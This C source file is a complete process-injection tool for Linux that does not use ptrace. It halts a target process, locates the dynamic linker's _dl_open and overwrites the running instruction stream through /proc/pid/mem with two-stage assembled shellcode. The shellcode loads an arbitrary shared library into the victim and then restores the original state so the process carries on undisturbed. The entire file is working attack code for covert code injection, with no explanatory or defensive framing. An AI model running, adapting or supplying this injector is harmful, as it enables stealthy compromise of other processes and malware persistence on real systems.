#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <wait.h>
#include <dirent.h>
#include <stdint.h>
#include <regex.h>
#include <assert.h>
#include <elf.h>
#include <dlfcn.h>
#include <signal.h>

#include <sys/prctl.h>
#include <sys/time.h>
#include <sys/user.h>
#include <sys/types.h>

#define STACK_SIZE  128
#define CODE_SIZE  512
#define STAGE2_SIZE 0x8000


char global_dl_path[1024];
uint64_t rip, rsp;

char code_backup[CODE_SIZE];
char stack_backup[STACK_SIZE];
char code_backup_hex_rep[CODE_SIZE*4];
char stack_backup_hex_rep[STACK_SIZE*4];

char *read_section64(int fd, Elf64_Shdr sh){
	char* buff = malloc(sh.sh_size);
	if(!buff){
		printf("%s:Failed to allocate %ldbytes\n",
				__func__, sh.sh_size);
	}
	assert(buff != NULL);
	assert(lseek(fd, (off_t)sh.sh_offset, SEEK_SET) == (off_t)sh.sh_offset);
	assert(read(fd, (void*)buff, sh.sh_size) == sh.sh_size);
	return buff;
}

uint64_t get_symbol_table64(int32_t fd,
		Elf64_Shdr sh_table[],
		uint32_t symbol_table)
{
	char* sym_name = "_dl_open";
	char *str_tbl;
	Elf64_Sym* sym_tbl;
	int i, symbol_count;

	sym_tbl = (Elf64_Sym*)read_section64(fd, sh_table[symbol_table]);
	int str_tbl_ndx = sh_table[symbol_table].sh_link;
	str_tbl = read_section64(fd, sh_table[str_tbl_ndx]);
	symbol_count = (sh_table[symbol_table].sh_size/sizeof(Elf64_Sym));
	

	int64_t dl_open_st_value = 0;
	for(i=0; i< symbol_count; i++) {
		if(!strncmp(sym_name, (str_tbl + sym_tbl[i].st_name), strlen(sym_name))){
			printf("0x%08lx ", sym_tbl[i].st_value);
			printf("0x%02x ", ELF32_ST_BIND(sym_tbl[i].st_info));
			printf("0x%02x ", ELF32_ST_TYPE(sym_tbl[i].st_info));
			printf("%s\n", (str_tbl + sym_tbl[i].st_name));
			dl_open_st_value = sym_tbl[i].st_value;
			if(dl_open_st_value == 0){
				continue;
			}
			else{
				break;
			}
		}
	} 
	return dl_open_st_value;
}


uint64_t get_dynamic_linker_address(pid_t pid){
	regex_t regex;
	int ret;
	ret = regcomp(&regex, ".*/ld-.*\.so", 0);
	if (ret) {
    	printf("Could not compile regex\n");
    	return 0;
	}

	char *maps_file = (char*)calloc(50, sizeof(char));
	sprintf(maps_file, "/proc/%d/maps", pid);
	char line[4096];
	char *str = (char*)calloc(1024, sizeof(char));
	
	FILE* fp = fopen(maps_file, "r");
	if(fp == NULL){
		printf("Could not open %s\n", maps_file);
		goto out;
	}
	uint64_t addr;
	while(fgets(line, sizeof(line), fp) != NULL){
		sscanf(line, "%lx-%*x %*s %*s %*s %*d %s", &addr, str);
		int val = regexec(&regex, str, 0, NULL, 0);
		if(val == 0){
			strcpy(global_dl_path, str);
			printf("ld.so found:: %s\n", str);
			printf("ld.so base:: 0x%lx\n", addr);
			break;
		}
	}

	free(maps_file);
	free(str);
	return addr;

out:
	free(maps_file);
	return 0;

}

uint64_t get_dl_open_offset(){
	int i;
	int fd = open(global_dl_path, O_RDONLY);
	if(fd < 1){
			printf("Error in open %s\n", global_dl_path);
			exit(-1);
	}

	Elf64_Ehdr* elf_header = (Elf64_Ehdr*)malloc(sizeof(Elf64_Ehdr));
	assert(lseek(fd, 0, SEEK_SET) == 0);
	assert(read(fd, (void*)elf_header, sizeof(Elf64_Ehdr)) == sizeof(Elf64_Ehdr));
	assert(lseek(fd, elf_header->e_shoff, SEEK_SET) == elf_header->e_shoff);
	Elf64_Shdr sh_table[elf_header->e_shnum];
	

	for(i = 0; i < elf_header->e_shnum; i++){
		assert(read(fd, (void*)&sh_table[i], elf_header->e_shentsize) == elf_header->e_shentsize);
	}

	char* sh_str;
	sh_str = read_section64(fd, sh_table[elf_header->e_shstrndx]);

	uint64_t dl_open_st_value = 0;
	for(i=0; i<elf_header->e_shnum; i++) {							
		if ((sh_table[i].sh_type==SHT_SYMTAB)
				|| (sh_table[i].sh_type==SHT_DYNSYM)) {
			printf("\n[Section %03d]\n", i);
			dl_open_st_value = get_symbol_table64(fd, sh_table, i);
			if(dl_open_st_value == 0){
				continue;
			}
			else{
				break;
			}
		}
	}
	return dl_open_st_value;
	
}

void get_registers(pid_t pid){

	char *syscall_file = (char*)calloc(50, sizeof(char));
	char line[4096];
	char *str = (char*)calloc(1024, sizeof(char));

	sprintf(syscall_file, "/proc/%d/syscall", pid);
	FILE* fp = fopen(syscall_file, "r");
	if(fp == NULL){
		printf("Could not open %s\n", syscall_file);
		exit(-1);
	}
	if(fgets(line, sizeof(line), fp) != NULL){
		int64_t rip_loc, rsp_loc;
		sscanf(line, "%*d %*x %*x %*x %*x %*x %*x %lx %lx", &rsp_loc, &rip_loc);
		rip = rip_loc;
		rsp = rsp_loc;
	}

	free(syscall_file);
	free(str);
}

void *assemble(char* assembly_code, int32_t size){
	char *binaryPath = "/usr/bin/gcc";
	char *binary = "gcc";
	char *arg1 = "-x";
	char *arg2 = "assembler";
	char *arg3 = "-";
	char *arg4 = "-o";
	char *arg5 = "/dev/stdout";
	char *arg6 = "-nostdlib";
	char *arg7 = "-Wl,--oformat=binary";
	char *arg8 = "-m64";

	void *data = (void*)malloc(size);
	memset(data,0, size);

	pid_t pid = 0;

	int pipe_fd_1[2];
	int pipe_fd_2[2];

	int status;

	pipe(pipe_fd_1);
	pipe(pipe_fd_2);
	
	pid = fork();

	if (pid == 0){

    	dup2(pipe_fd_1[0], fileno(stdin));
    	dup2(pipe_fd_2[1], fileno(stdout));    

    	close(pipe_fd_1[1]);
		close(pipe_fd_2[0]);
		
    	execl(binaryPath, binary, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, (char*) NULL);

    	close(pipe_fd_1[0]);
		close(pipe_fd_2[1]);

    	exit(1);
	}
	close(pipe_fd_1[0]);
	close(pipe_fd_2[1]);

	write(pipe_fd_1[1], assembly_code, strlen(assembly_code));
	close(pipe_fd_1[1]);

	read(pipe_fd_2[0], (void*)data, size);
	
	close(pipe_fd_2[0]);

    kill(pid, SIGKILL); 
  	waitpid(pid, &status, 0);

	return data;

}

void create_code_to_inject_1_and_assemble(pid_t pid, char* tmp_file_name){
	
	char* code_to_inject_1 = (char*)calloc(CODE_SIZE, sizeof(char));
	void* code_to_inject_binary_1= (void*)calloc(CODE_SIZE, 1);

	sprintf(code_to_inject_1, ".intel_syntax noprefix\n.globl _start\n_start:\n" 
	"\npushf"
	"\npush rax"
	"\npush rbx"
	"\npush rcx"
	"\npush rdx"
	"\npush rbp"
	"\npush rsi"
	"\npush rdi"
	"\npush r8"
	"\npush r9"
	"\npush r10"
	"\npush r11"
	"\npush r12"
	"\npush r13"
	"\npush r14"
	"\npush r15" 
	"\nmov rax, 2"
	"\nlea rdi, path[rip]"
	"\nxor rsi, rsi"
	"\nxor rdx, rdx"
	"\nsyscall"
	"\nmov r14, rax"
	"\nmov rax, 9"
	"\nxor rdi, rdi" 
	"\nmov rsi, %d" //STAGE2_SIZE 
	"\nmov rdx, 0x7"
	"\nmov r10, 0x2"
	"\nmov r8, r14"
	"\nxor r9, r9" 
	"\nsyscall"
	"\nmov r15, rax"
	"\nmov rax, 3"
	"\nmov rdi, r14"
	"\nsyscall"
	"\nmov rax, 87"
	"\nlea rdi, path[rip]"
	"\nsyscall"
	"\njmp r15"
	"\npath:"
	"\n\t.string \"%s\"", // stage2_path 
	STAGE2_SIZE,  
	tmp_file_name);

	memcpy(code_to_inject_binary_1, assemble(code_to_inject_1, CODE_SIZE), CODE_SIZE);

	char mem_file_path[64] = {0};
	void* code_backup_local = (void*)malloc(CODE_SIZE);
	memset(code_backup_local,0, CODE_SIZE);
	void* stack_backup_local = (void*)malloc(STACK_SIZE);
	memset(stack_backup_local,0, STACK_SIZE);

	sprintf(mem_file_path, "/proc/%d/mem", pid);
	FILE *fp;
	fp = fopen(mem_file_path, "wb+");
	fseek(fp, rip, SEEK_SET);
	fread((void*)code_backup_local, sizeof(char), CODE_SIZE, fp);

	fseek(fp, (rsp-STACK_SIZE), SEEK_SET);
	fread((void*)stack_backup_local, sizeof(char), STACK_SIZE, fp);

	fseek(fp, rip, SEEK_SET);
	fwrite((void*)code_to_inject_binary_1, sizeof(char), CODE_SIZE, fp);

	memcpy((void*)code_backup, code_backup_local, CODE_SIZE);
	memcpy((void*)stack_backup, stack_backup_local, STACK_SIZE);
	fclose(fp);


	char* code_backup_hex_rep_local = (char*)calloc(CODE_SIZE*4, 1);
	char* stack_backup_hex_rep_local = (char*)calloc(STACK_SIZE*4, 1);
	char* code_temp =(char*)calloc(8, 1);
	char* stack_temp =(char*)calloc(8, 1);


	int i = 0;
	for(i=0; i<CODE_SIZE; i++){
		memset(code_temp, 0, 8);
		if(i == CODE_SIZE-1){
			if(code_backup[i] < 0){
				sprintf(code_temp,"%d", 256 + code_backup[i]);
			}
			else{
				sprintf(code_temp, "%d", code_backup[i]);
			}
			
		}
		else{
			if(code_backup[i] < 0){
				sprintf(code_temp, "%d,", 256 + code_backup[i]);
				
			}
			else{
				sprintf(code_temp,"%d,", code_backup[i]);
				
			}
		}
		
		if(strlen(code_backup_hex_rep_local) == 0){
			strcpy(code_backup_hex_rep_local, code_temp);
		}
		else{
			strcat(code_backup_hex_rep_local, code_temp);
		}
		

	}

	for(i=0; i<STACK_SIZE; i++){
		memset(stack_temp, 0, 8);
		if(i == STACK_SIZE-1){
			if(stack_backup[i] < 0){
				sprintf(stack_temp, "%d", 256 + stack_backup[i]);
			}
			else{
				sprintf(stack_temp, "%d", stack_backup[i]);
			}
		}
		else{
			if(stack_backup[i] < 0){
				sprintf(stack_temp, "%d,", 256 + stack_backup[i]);
				
			}
			else{
				sprintf(stack_temp, "%d,", stack_backup[i]);
				
			}
		}
		
		if(strlen(stack_backup_hex_rep_local) == 0){
			strcpy(stack_backup_hex_rep_local, stack_temp);
		}
		else{
			strcat(stack_backup_hex_rep_local, stack_temp);
		}
	}

	strcpy(code_backup_hex_rep, code_backup_hex_rep_local);
	strcpy(stack_backup_hex_rep, stack_backup_hex_rep_local);
	//printf("code_backup_hex_rep: %s\n", code_backup_hex_rep);
	//printf("stack_backup_hex_rep: %s\n", stack_backup_hex_rep);

	free(code_backup_local);
	free(stack_backup_local);
	free(code_backup_hex_rep_local);
	free(stack_backup_hex_rep_local);


}

void create_code_to_inject_2_and_assemble_and_write_to_tmp_file(int64_t dl_open_addr, char* lib_path, int32_t tmp_fd){

	char* code_to_inject_2 = (char*)calloc(STAGE2_SIZE, sizeof(char));
	void* code_to_inject_binary_2= (void*)calloc(STAGE2_SIZE, sizeof(char));
	
	
	sprintf(code_to_inject_2, ".intel_syntax noprefix\n.globl _start\n_start:\n" 
	//"\nint3"
	"\ncld"
	"\nfxsave moar_regs[rip]"

	"\nmov rax, 2"
	"\nlea rdi, proc_self_mem[rip]"
	"\nmov rsi, 2"
	"\nxor rdx, rdx"
	"\nsyscall"
	"\nmov r15, rax"

	"\nmov rax, 8"
	"\nmov rdi, r15"
	"\nmov rsi, %ld" //rip
	"\nxor rdx, rdx"
	"\nsyscall"

	"\nmov rax, 1"
	"\nmov rdi, r15"
	"\nlea rsi, old_code[rip]" 
	"\nmov rdx, %d" // len(code_backup)
	"\nsyscall"

	"\nmov rax, 3"
	"\nmov rdi, r15"
	"\nsyscall"

	"\nlea rdi, new_stack_base[rip-%d]" // STACK_SIZE
	"\nmov rsi, %ld" // rsp-STACK_SIZE
	"\nmov rcx, %d" // STACK_SIZE
	"\nrep movsb"

	"\nmov rdi, %ld" // rsp-STACK_SIZE
	"\nlea rsi, old_stack[rip]"
	"\nmov rcx, %d" // STACK_SIZE
	"\nrep movsb"

	"\nlea rsp, new_stack_base[rip-%d]" // STACK_SIZE

	"\nlea rdi, lib_path[rip]"
	"\nmov rsi, 2"
	"\nmov rdx, %ld" // dl_open_addr
	"\nxor rcx, rcx"
	"\nmov rax, %ld" // dl_open_addr
	"\ncall rax"

	"\nfxrstor moar_regs[rip]"
	"\npop r15"
	"\npop r14"
	"\npop r13"
	"\npop r12"
	"\npop r11"
	"\npop r10"
	"\npop r9"
	"\npop r8"
	"\npop rdi"
	"\npop rsi"
	"\npop rbp"
	"\npop rdx"
	"\npop rcx"
	"\npop rbx"
	"\npop rax"
	"\npopf"

	"\nmov rsp, %ld" // rsp
	"\njmp old_rip[rip]"

	"\nold_rip:"
		"\n\t.quad %ld" // rip
	"\nold_code:"
		"\n\t.byte %s" // {",".join(map(str, code_backup))}
	"\nold_stack:"
		"\n\t.byte %s" // {",".join(map(str, stack_backup))}
		"\n\t.align 16"
	"\nmoar_regs:"
		"\n\t.space 512"
	"\nlib_path:"
		"\n\t.string \"%s\"" // lib_path
	"\nproc_self_mem:"
		"\n\t.string \"%s\"" // /proc/self/mem
	"\nnew_stack:"
		"\n\t.balign 0x8000"
	"\nnew_stack_base:\n", rip, CODE_SIZE, STACK_SIZE,
	(rsp-STACK_SIZE),
	STACK_SIZE,
	(rsp-STACK_SIZE),
	STACK_SIZE,
	STACK_SIZE,
	dl_open_addr,
	dl_open_addr,
	rsp, rip,
	code_backup_hex_rep,
	stack_backup_hex_rep,
	lib_path, 
	"/proc/self/mem");
	// sprintf(code_to_inject_2, ".intel_syntax noprefix\n.globl _start\n_start:\n" 
	// "int3");
	
	memcpy(code_to_inject_binary_2, assemble(code_to_inject_2, STAGE2_SIZE), STAGE2_SIZE);
		
	write(tmp_fd, code_to_inject_binary_2, STAGE2_SIZE);
	close(tmp_fd);
}

void inject_without_ptrace(pid_t pid, char* lib_path){
	kill(pid, SIGSTOP);
	uint64_t dynamic_linker_address = get_dynamic_linker_address(pid);
	if(dynamic_linker_address == 0){
		printf("get_dynamic_linker_address Failed!\n");
		exit(-1);
	}
	printf("global_dl_path: %s\n", global_dl_path);
	uint64_t dl_open_st_value = get_dl_open_offset();
	printf("dl_open_st_value: 0x%08lx\n", dl_open_st_value);

	uint64_t dl_open_addr = dynamic_linker_address + dl_open_st_value;
	printf("_dl_open: 0x%lx\n", dl_open_addr);

	get_registers(pid);
	printf("rip: 0x%lx\nrsp: 0x%lx\n", rip, rsp);

	int byte_count = 8;
	char data[64];
	FILE *fp;
	fp = fopen("/dev/urandom", "r");
	fread(&data, 1, byte_count, fp);
	fclose(fp);
	char tmp_file_name[128];
	sprintf(tmp_file_name, "/tmp/stage2_%x.bin", data);
	int tmp_fd = open(tmp_file_name, O_RDWR | O_CREAT, 00666);

	create_code_to_inject_1_and_assemble(pid, tmp_file_name);
	create_code_to_inject_2_and_assemble_and_write_to_tmp_file(dl_open_addr, lib_path, tmp_fd);
	kill(pid, SIGCONT);
}

int main(){
	 
	printf("Please enter target pid: ");
    pid_t target_pid = 0;
    scanf("%d", &target_pid);
    if(target_pid == 0){
        return 0;
    }
    char lib_path[PATH_MAX];
    if(getcwd(lib_path, sizeof(lib_path)) != NULL){
        strcat(lib_path, "/libs");
        strcat(lib_path, "/inject_lib.so");
    }
    else{
        printf("error");
    }

    inject_without_ptrace(target_pid, lib_path);
    return 1;
	
}